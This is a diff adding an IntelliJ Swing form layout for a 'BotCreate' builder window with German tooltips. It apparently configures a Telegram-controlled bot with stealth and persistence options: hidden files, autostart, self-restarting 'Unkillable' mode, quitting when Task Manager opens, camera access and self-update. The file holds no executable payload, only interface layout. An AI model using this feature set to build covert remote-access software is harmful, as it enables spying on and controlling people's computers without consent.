@@ -1,0 +1,206 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<form xmlns="http://www.intellij.com/uidesigner/form/" version="1" bind-to-class="ProjectX.BotCreate">
+  <grid id="27dc6" binding="Back" layout-manager="GridLayoutManager" row-count="9" column-count="3" same-size-horizontally="false" same-size-vertically="false" hgap="-1" vgap="-1">
+    <margin top="0" left="0" bottom="0" right="0"/>
+    <constraints>
+      <xy x="20" y="20" width="400" height="400"/>
+    </constraints>
+    <properties>
+      <background color="-13190411"/>
+      <inheritsPopupMenu value="false"/>
+      <minimumSize width="400" height="400"/>
+      <preferredSize width="300" height="400"/>
+    </properties>
+    <border type="none"/>
+    <children>
+      <component id="da641" class="javax.swing.JCheckBox" binding="hiddenCheckBox" default-binding="true">
+        <constraints>
+          <grid row="3" column="0" row-span="1" col-span="2" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Hidden"/>
+          <toolTipText value="Ob die Dateien vom Bot versteckt sein sollen."/>
+        </properties>
+      </component>
+      <component id="ec6f" class="javax.swing.JButton" binding="createButton" default-binding="true">
+        <constraints>
+          <grid row="8" column="0" row-span="1" col-span="3" vsize-policy="0" hsize-policy="3" anchor="0" fill="1" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Create"/>
+        </properties>
+      </component>
+      <component id="afd16" class="javax.swing.JCheckBox" binding="autostartCheckBox" default-binding="true">
+        <constraints>
+          <grid row="4" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false">
+            <preferred-size width="115" height="46"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <selected value="true"/>
+          <text value="Autostart"/>
+          <toolTipText value="Der Bot startet mit Windows."/>
+        </properties>
+      </component>
+      <component id="bc7f4" class="javax.swing.JCheckBox" binding="unkillableCheckBox" default-binding="true">
+        <constraints>
+          <grid row="5" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false">
+            <preferred-size width="115" height="26"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Unkillable"/>
+          <toolTipText value="Bot startet sich selbst wieder wenn er beendet wurde."/>
+        </properties>
+      </component>
+      <component id="756cc" class="javax.swing.JCheckBox" binding="trollFunctionsCheckBox" default-binding="true">
+        <constraints>
+          <grid row="3" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="TrollFunctions"/>
+          <toolTipText value="Fügt diverse Troll Funktionen hinzu."/>
+        </properties>
+      </component>
+      <component id="18823" class="javax.swing.JCheckBox" binding="startUpNotificationCheckBox" default-binding="true">
+        <constraints>
+          <grid row="4" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false">
+            <preferred-size width="91" height="46"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="StartUp Notification"/>
+          <toolTipText value="Der Bot schreibt Ihnen sobald das Gerät gestartet wird."/>
+        </properties>
+      </component>
+      <component id="8b1a1" class="javax.swing.JCheckBox" binding="antiAVCheckBox" default-binding="true">
+        <constraints>
+          <grid row="5" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false">
+            <preferred-size width="64" height="26"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <selected value="true"/>
+          <text value="Silent Mode"/>
+          <toolTipText value="Der Bot schickt dir keine Nachricht über unwichtige Infos (Z.B.: Taskchecker startet)"/>
+        </properties>
+      </component>
+      <component id="ea361" class="javax.swing.JCheckBox" binding="cameraCheckBox" default-binding="true">
+        <constraints>
+          <grid row="6" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false">
+            <preferred-size width="115" height="24"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Camera"/>
+          <toolTipText value="Ob der Bot Zugriff auf die Kamera haben soll."/>
+        </properties>
+      </component>
+      <component id="becc8" class="javax.swing.JCheckBox" binding="privateCheckBox" default-binding="true">
+        <constraints>
+          <grid row="6" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <selected value="true"/>
+          <text value="AutoUpdate"/>
+          <toolTipText value="Der Bot wird sich selbst updaten. Ihre Einstellungen bleiben erhalten."/>
+        </properties>
+      </component>
+      <component id="a31f0" class="javax.swing.JCheckBox" binding="taskHideCheckBox" default-binding="true">
+        <constraints>
+          <grid row="7" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false">
+            <preferred-size width="115" height="24"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Task-Hide"/>
+          <toolTipText value="Beendet das Program sobald der Taskmanager startet. "/>
+        </properties>
+      </component>
+      <component id="22cd7" class="javax.swing.JCheckBox" binding="aliveCheckCheckBox" default-binding="true">
+        <constraints>
+          <grid row="7" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="3" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <enabled value="true"/>
+          <text value="Alive-Check"/>
+          <toolTipText value="Zeigt anhand eines Icons ob das Programm noch läuft"/>
+        </properties>
+      </component>
+      <component id="199d3" class="javax.swing.JPasswordField" binding="passwordPasswordField" default-binding="true">
+        <constraints>
+          <grid row="2" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="6" anchor="8" fill="1" indent="0" use-parent-layout="false">
+            <preferred-size width="150" height="-1"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value=""/>
+          <toolTipText value="Passwort des Bottes"/>
+        </properties>
+      </component>
+      <component id="333ea" class="javax.swing.JLabel">
+        <constraints>
+          <grid row="2" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="0" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Password:"/>
+        </properties>
+      </component>
+      <component id="15da5" class="javax.swing.JTextField" binding="telegramBotKeyTextField" default-binding="true">
+        <constraints>
+          <grid row="0" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="6" anchor="8" fill="1" indent="0" use-parent-layout="false">
+            <preferred-size width="150" height="-1"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Bot Token"/>
+          <toolTipText value="Der Token des Botes"/>
+        </properties>
+      </component>
+      <component id="6389c" class="javax.swing.JTextField" binding="botNameTextField" default-binding="true">
+        <constraints>
+          <grid row="1" column="2" row-span="1" col-span="1" vsize-policy="0" hsize-policy="6" anchor="8" fill="1" indent="0" use-parent-layout="false">
+            <preferred-size width="150" height="-1"/>
+          </grid>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Bot Name"/>
+          <toolTipText value="Der Name des Botes. "/>
+        </properties>
+      </component>
+      <component id="a0a82" class="javax.swing.JLabel">
+        <constraints>
+          <grid row="1" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="0" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Bot-Name:"/>
+        </properties>
+      </component>
+      <component id="fac62" class="javax.swing.JLabel">
+        <constraints>
+          <grid row="0" column="0" row-span="1" col-span="1" vsize-policy="0" hsize-policy="0" anchor="8" fill="0" indent="0" use-parent-layout="false"/>
+        </constraints>
+        <properties>
+          <background color="-13190411"/>
+          <text value="Bot-Token:"/>
+        </properties>
+      </component>
+    </children>
+  </grid>
+</form>
